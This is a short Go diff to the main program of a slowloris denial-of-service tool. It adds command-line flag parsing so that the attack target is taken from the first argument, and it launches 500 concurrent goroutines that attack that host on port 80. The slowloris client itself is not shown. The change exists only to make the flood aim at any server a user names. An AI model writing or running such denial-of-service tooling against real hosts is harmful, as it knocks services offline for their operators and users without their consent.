@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"os"
+	"flag"
 	"os/signal"
 	"syscall"
 
@@ -11,6 +12,9 @@ import (
 )
 
 func main() {
+
+	flag.Parse()
+
 	client, err := slowloris.NewClient()
 
 	if err != nil {
@@ -32,7 +36,7 @@ func main() {
 	start := make(chan struct{})
 
 	for i := 0; i < 500; i++ {
-		go client.Attack(&start, "")
+		go client.Attack(&start, fmt.Sprintf("%s:%s", flag.Args()[0], "80"))
 	}
 
 	close(start)
